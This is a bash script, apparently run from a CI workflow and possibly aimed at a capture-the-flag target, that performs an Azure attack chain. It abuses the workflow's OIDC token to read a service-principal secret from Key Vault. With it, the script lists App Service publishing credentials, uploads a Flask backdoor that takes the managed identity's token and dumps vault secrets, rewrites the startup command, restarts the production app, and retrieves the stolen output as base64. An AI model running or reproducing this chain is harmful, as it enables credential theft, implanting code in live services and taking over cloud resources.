#!/usr/bin/env bash
set -euo pipefail
T="${AZURE_TENANT_ID:?}"; C="${AZURE_CLIENT_ID:?}"
PROD='https://kv-tbl-prod-x3euoz.vault.azure.net'
say(){ echo "$*"; }
J=$(curl -sS --max-time 20 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
BASE_R=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d "client_id=$C" -d 'grant_type=client_credentials' -d 'client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer' -d "client_assertion=$J" -d 'scope=https://vault.azure.net/.default')
BASE=$(echo "$BASE_R" | jq -r '.access_token // empty'); [[ -n "$BASE" ]] || { say BASE_FAIL; exit 0; }
RPT=$(curl -sS --max-time 20 -H "Authorization: Bearer $BASE" "$PROD/secrets/reporting-service-principal?api-version=7.4")
RPT_ID=$(echo "$RPT" | jq -r '.value|fromjson|.appId // empty'); RPT_SEC=$(echo "$RPT" | jq -r '.value|fromjson|.clientSecret // empty'); RPT_TEN=$(echo "$RPT" | jq -r '.value|fromjson|.tenantId // empty')
RPT_ARM=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$RPT_TEN/oauth2/v2.0/token" -d "client_id=$RPT_ID" -d 'grant_type=client_credentials' -d "client_secret=$RPT_SEC" -d 'scope=https://management.azure.com/.default' | jq -r '.access_token // empty')
say "RPT_ARM=$([[ -n "$RPT_ARM" ]] && echo OK || echo FAIL)"
BASE_URL="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod"
PC=$(curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RPT_ARM" -H 'Content-Length: 0' "$BASE_URL/config/publishingcredentials/list?api-version=2023-01-01")
PU=$(echo "$PC" | jq -r '.properties.publishingUserName // empty' 2>/dev/null || true); PP=$(echo "$PC" | jq -r '.properties.publishingPassword // empty' 2>/dev/null || true)
say "PUB_CREDS=$([[ -n "$PU" && -n "$PP" ]] && echo OK || echo FAIL)"
[[ -n "$PU" && -n "$PP" ]] || exit 0
SCM='https://app-tbl-reporting-prod.scm.azurewebsites.net'
cat > /tmp/app.py <<'PYEOF'
import os, json, urllib.request
from flask import Flask
app = Flask(__name__)
def get(url, hdr=None):
    req = urllib.request.Request(url, headers=hdr or {})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.status, r.read().decode(errors='replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:500]
    except Exception as e:
        return 0, str(e)[:300]
@app.route('/e')
def e():
    ie = os.environ.get('IDENTITY_ENDPOINT',''); ih = os.environ.get('IDENTITY_HEADER','')
    if not ie or not ih:
        for p in ['/proc/1/environ','/proc/self/environ']:
            try:
                d={}
                for x in open(p,'rb').read().split(b'\0'):
                    if b'=' in x:
                        k,v=x.split(b'=',1); d[k.decode(errors='ignore')]=v.decode(errors='ignore')
                ie=ie or d.get('IDENTITY_ENDPOINT',''); ih=ih or d.get('IDENTITY_HEADER','')
            except Exception: pass
    out={'identity_endpoint_set':bool(ie),'identity_header_set':bool(ih)}
    if not ie or not ih: return json.dumps(out)
    st,b = get(ie+'?resource=https://vault.azure.net&api-version=2019-08-01', {'X-IDENTITY-HEADER': ih})
    try: tok=json.loads(b).get('access_token','')
    except Exception: tok=''
    out['mi_status']=st; out['mi_token_len']=len(tok)
    if tok:
        for vault in ['kv-tbl-sec-x3euoz','kv-tbl-prod-x3euoz']:
            for path in ['secrets?api-version=7.4','secrets/flag?api-version=7.4','secrets/FLAG?api-version=7.4']:
                s,b=get(f'https://{vault}.vault.azure.net/{path}', {'Authorization':'Bearer '+tok})
                out[f'{vault}/{path}']=b[:1000]
    return json.dumps(out)
@app.route('/')
def root(): return 'ok'
if __name__ == '__main__': app.run(host='0.0.0.0', port=8000)
PYEOF
cat > /tmp/startup.sh <<'SH'
#!/bin/bash
python3 -m pip install flask gunicorn >/dev/null 2>&1 || true
exec gunicorn --bind 0.0.0.0:8000 app:app
SH
curl -sS --max-time 20 -u "$PU:$PP" -X PUT -H 'If-Match: *' -H 'Content-Type: application/octet-stream' --data-binary @/tmp/app.py "$SCM/api/vfs/site/wwwroot/app.py" -o /tmp/v1 -w 'VFS_APP_HTTP=%{http_code}\n'
curl -sS --max-time 20 -u "$PU:$PP" -X PUT -H 'If-Match: *' -H 'Content-Type: application/octet-stream' --data-binary @/tmp/startup.sh "$SCM/api/vfs/site/wwwroot/startup.sh" -o /tmp/v2 -w 'VFS_START_HTTP=%{http_code}\n'
WEB=$(jq -nc '{properties:{appCommandLine:"bash /home/site/wwwroot/startup.sh"}}')
curl -sS --max-time 20 -X PUT -H "Authorization: Bearer $RPT_ARM" -H 'Content-Type: application/json' "$BASE_URL/config/web?api-version=2023-01-01" -d "$WEB" -o /tmp/web -w 'SET_WEB_HTTP=%{http_code}\n'
curl -sS --max-time 20 -X POST -H "Authorization: Bearer $RPT_ARM" "$BASE_URL/restart?api-version=2023-01-01" -o /tmp/restart -w 'RESTART_HTTP=%{http_code}\n'
sleep 35
curl -sS --max-time 30 "https://app-tbl-reporting-prod.azurewebsites.net/e" -o /tmp/e -w 'APP_E_HTTP=%{http_code}\n'
say "APP_E_B64=$(base64 -w0 </tmp/e)"
say DONE
